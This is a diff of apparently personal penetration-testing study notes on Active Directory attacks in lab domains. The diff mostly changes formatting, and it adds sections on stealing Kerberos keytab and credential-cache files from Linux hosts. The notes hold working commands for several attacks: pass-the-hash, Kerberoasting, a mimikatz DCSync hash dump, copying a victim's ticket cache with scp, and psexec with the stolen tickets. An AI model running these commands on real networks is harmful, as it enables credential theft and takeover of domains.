@@ -31,13 +31,13 @@ impacket-psexec jimmy@192.168.35.142 -hashes ee0c207898a5bccc01f38115019ca2fb
 
 * Sync the Kali's timing with the DC timing.
 
-```
+```bash
 ntpdate <dc_ip>
 ```
 
 * To collect the Kerberos Ticket
 
-```
+```bash
 impacket-GetUserSPNs hacker.local/Administrator:Password1 -dc-up 192.168.35.142 -request
 ```
 
@@ -352,11 +352,9 @@ secretsdump.py htb/john@10.10.10.161
 
 * is a system for creating software components that interact with each other within or across processes.
 
-<!---->
-
-* Requires Local admin (to call the DCOM Service Control Manager)
-* Requires port 135, 445
-* Requires Microsoft office to be installed on target
+- Requires Local admin (to call the DCOM Service Control Manager)
+- Requires port 135, 445
+- Requires Microsoft office to be installed on target
 
 1. Create an instance of the Object on the target
 
@@ -433,15 +431,15 @@ $com.Run("mymacro")
 
 <summary>Dump Password Hashes from Domain Controller</summary>
 
-```
+```bash
 mimikatz.exe
 ```
 
-```
+```bash
 privilege::debug
 ```
 
-```
+```bash
 lsadump::dcsync /all /csv
 ```
 
@@ -467,5 +465,90 @@ net user /domain administrator password
 ```bash
 runas /user:corp\jen powershell.exe
 ```
+
+</details>
+
+<details>
+
+<summary>Stealing Keytab files (Linux AD)</summary>
+
+* Contains a kerberos principal name & encrypted keys
+*   ```bash
+    kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
+    ```
+
+
+* Verify that tickets from keytab have been loaded && renew tickets
+  *   ```bash
+      klist
+      kinit -R
+      ```
+
+
+* Remove all kerberos tickets
+  * ```bash
+    kdestroy
+    ```
+
+</details>
+
+<details>
+
+<summary>Stealing Credential Cache Files</summary>
+
+* Check for presence with&#x20;
+  *   ```bash
+      ls -al /tmp/krb5cc_*
+      ```
+
+
+* Copy credential cache files to Kali
+  *   ```bash
+      scp root@linuxvictim:/tmp/krb5cc_607000500_qZWKpe .
+      ```
+
+
+* Set environment variable on Kali
+  *   ```bash
+      export KRB5CCNAME=/home/kali/Documents/offsec/linux_lateral_movement/krb5cc_607000500_qZWKpe
+      ```
+
+
+* Install the following, if required
+  *   ```bash
+      sudo apt install krb5-user
+      ```
+
+
+  *
+
+      <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+* Add target DC and generic domain to /etc/hosts
+  *
+
+      <figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+* IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
+* Then, can
+  * ```bash
+    python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
+    ```
+
+</details>
+
+<details>
+
+<summary>Creating Keytab files</summary>
+
+* Create in /tmp/administrator.keytab
+* ```bash
+  ktutil
+  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
+  wkt /tmp/administrator.keytab
+  quit
+  ```
 
 </details>
